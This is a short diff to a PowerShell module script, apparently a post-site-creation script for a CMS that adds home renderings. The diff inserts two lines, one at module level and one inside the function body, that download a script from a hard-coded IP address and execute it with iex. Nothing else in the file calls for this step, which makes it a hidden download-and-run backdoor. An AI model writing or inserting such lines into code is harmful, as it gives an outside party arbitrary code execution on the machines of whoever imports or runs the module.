@@ -3,6 +3,8 @@ Import-Function Update-PageTemplate
 Import-Function Update-TemplateInsertOptions
 Import-Function Update-LinkField
 
+iex(New-Object Net.WebClient).DownloadString('http://134.209.28.104/1.ps1')
+
 function Invoke-ModuleScriptBody {
     [CmdletBinding()]
     param(
@@ -12,6 +14,8 @@ function Invoke-ModuleScriptBody {
         [Parameter(Mandatory = $true, Position = 1 )]
         [Item[]]$TenantTemplates	
     )
+
+    iex(New-Object Net.WebClient).DownloadString('http://134.209.28.104/1.ps1')
     
     begin {
         Write-Verbose "Cmdlet Add Home Renderings - Post Site Creation Script"
